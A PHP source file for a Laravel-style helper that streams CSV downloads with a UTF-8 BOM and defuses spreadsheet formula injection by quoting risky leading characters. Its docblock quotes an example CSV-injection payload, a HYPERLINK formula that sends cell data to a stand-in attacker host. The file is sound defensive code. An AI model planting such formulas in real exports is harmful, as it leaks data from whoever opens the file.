<?php

declare(strict_types=1);

namespace App\Support\Http;

use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * A CSV file, streamed.
 *
 * STREAMED, not built in memory: a year of daily rows, or every lead an
 * academy ever captured, is the sort of thing somebody asks for once and it
 * must not be the request that takes the process down.
 *
 * These are the only responses in the API that do not answer in the
 * `{data:…}` envelope, and that is the point — the response is a file, and a
 * spreadsheet cannot unwrap JSON.
 */
final class CsvDownload
{
    /**
     * @param  list<string>  $headers
     * @param  iterable<int, list<mixed>>  $rows
     */
    public static function stream(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        return response()->streamDownload(function () use ($headers, $rows): void {
            $handle = fopen('php://output', 'wb');

            if ($handle === false) {
                return;
            }

            /*
             * A UTF-8 BOM. Excel on Windows reads a BOM-less UTF-8 file as
             * the local codepage, which turns every non-ASCII course title
             * into mojibake — and this product's first academy is Bengali.
             */
            fwrite($handle, "\xEF\xBB\xBF");

            fputcsv($handle, $headers);

            foreach ($rows as $row) {
                fputcsv($handle, array_map(self::cell(...), $row));
            }

            fclose($handle);
        }, $filename, [
            'Content-Type' => 'text/csv; charset=UTF-8',
            // A CSV is opened by a spreadsheet, and a spreadsheet that renders
            // it as a page is a support ticket.
            'Content-Disposition' => 'attachment; filename="'.$filename.'"',
        ]);
    }

    /**
     * Defuses a cell a spreadsheet would run as a FORMULA.
     *
     * Every string in an export was typed by somebody — a course title by an
     * instructor, a lead's name by a stranger on the internet — and
     * `=HYPERLINK("https://evil.example/?"&A2,"Open")` in a name cell is a
     * working attack on the admin who opens the file. A leading quote makes
     * Excel, Sheets and LibreOffice read it as text (OWASP, "CSV Injection").
     *
     * Only STRINGS are touched: a negative revenue figure is an int and stays
     * a number a spreadsheet can sum.
     */
    public static function cell(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true) ? "'".$value : $value;
    }
}
